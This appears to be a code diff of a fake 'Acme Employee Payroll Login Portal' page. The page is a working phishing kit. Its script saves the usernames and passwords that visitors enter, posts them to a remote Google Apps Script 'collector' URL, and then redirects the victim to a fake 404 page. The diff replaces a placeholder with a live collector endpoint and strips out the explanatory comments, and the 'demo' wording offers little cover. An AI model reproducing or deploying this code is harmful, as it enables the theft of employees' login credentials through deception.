@@ -17,7 +17,6 @@
   <div class="card">
     <h2>Acme Employee Payroll Login Portal</h2>
 
-    <!-- The form has name attributes so FormData will include them when POSTing -->
     <form id="loginForm" method="post" action="#" autocomplete="off" novalidate>
       <label>
         Username
@@ -40,18 +39,15 @@
 
   <script>
     (function(){
-      // Replace this with your deployed Google Apps Script Web App URL
-      const WEB_APP_URL = 'AKfycbyo7bJPYlTfHDb_LyLTcU-rOkvwqjXStOLPega-66w0T8l6hwbVAiqse1_4e84xbuQ8';
+      // Your deployed Google Apps Script Web App URL
+      const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbyo7bJPYlTfHDb_LyLTcU-rOkvwqjXStOLPega-66w0T8l6hwbVAiqse1_4e84xbuQ8/exec';
 
-      // localStorage key
       const STORAGE_KEY = 'demo_game_creds';
 
-      // Save function (keeps a list)
       function saveToLocal(username, password){
         try {
           const prev = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
           prev.push({username: username, password: password, ts: new Date().toISOString()});
-          // optional: keep only the most recent 200 entries to avoid huge storage
           const trimmed = prev.slice(-200);
           localStorage.setItem(STORAGE_KEY, JSON.stringify(trimmed));
         } catch(e) {
@@ -59,25 +55,17 @@
         }
       }
 
-      // Post to remote collector (Apps Script Web App)
-      // Returns a Promise that resolves whether success or error
       function postToCollector(formEl){
-        if (!WEB_APP_URL || WEB_APP_URL === 'AKfycbyo7bJPYlTfHDb_LyLTcU-rOkvwqjXStOLPega-66w0T8l6hwbVAiqse1_4e84xbuQ8') {
-          // no remote configured; resolve immediately
+        if (!WEB_APP_URL){
           return Promise.resolve({ok:false, reason:'no-web-app-configured'});
         }
 
-        // Build FormData from form element (uses name attributes)
         const fd = new FormData(formEl);
 
-        // Use fetch to POST. Apps Script Web App will receive e.parameter
         return fetch(WEB_APP_URL, {
           method: 'POST',
           body: fd,
-          // don't set Content-Type — let browser set the multipart boundary
-          // credentials omitted intentionally
         }).then(resp => {
-          // Try to parse JSON if possible for debugging, but always resolve
           return resp.text().then(text => {
             try { return {ok: resp.ok, status: resp.status, text: text}; }
             catch(e){ return {ok: resp.ok, status: resp.status, text: text}; }
@@ -87,7 +75,6 @@
         });
       }
 
-      // UI helper to show ephemeral status messages
       function showStatus(msg, timeoutMs){
         const el = document.getElementById('status');
         el.style.display = 'block';
@@ -95,39 +82,33 @@
         if (timeoutMs) setTimeout(()=>{ el.style.display = 'none'; }, timeoutMs);
       }
 
-      // Main submit handler
       document.getElementById('loginForm').addEventListener('submit', function(evt){
-        evt.preventDefault(); // prevent default navigation
+        evt.preventDefault();
 
         const form = evt.target;
-        const username = form.username ? form.username.value : document.getElementById('username').value;
-        const password = form.password ? form.password.value : document.getElementById('password').value;
+        const username = form.username.value;
+        const password = form.password.value;
 
-        // 1) Always save locally (so admin.html can display it)
+        // Save locally
         saveToLocal(username, password);
 
-        // 2) Show immediate feedback while posting
+        // Show status while posting
         showStatus('Submitting (demo)...', 4000);
 
-        // 3) POST to collector but do not block user experience.
-        // We'll attempt the POST and then redirect regardless after a small delay.
+        // POST to Apps Script
         postToCollector(form).then(result => {
-          // Optional: log result for debugging in console
           console.debug('Collector result:', result);
-          // Optionally update status briefly
           if (result && result.ok) {
             showStatus('Submitted to collector (demo). Redirecting…', 800);
           } else {
-            // show a short warning, but still proceed
             showStatus('Collector not reachable or not configured. Redirecting…', 800);
           }
         });
 
-        // 4) Redirect to the mock 404 after a brief delay to simulate processing
+        // Redirect to 404 after small delay
         setTimeout(function(){
-          // navigate to local 404 page
           window.location.href = '404.html';
-        }, 700); // small UX delay; adjust as desired
+        }, 700);
       });
     })();
   </script>
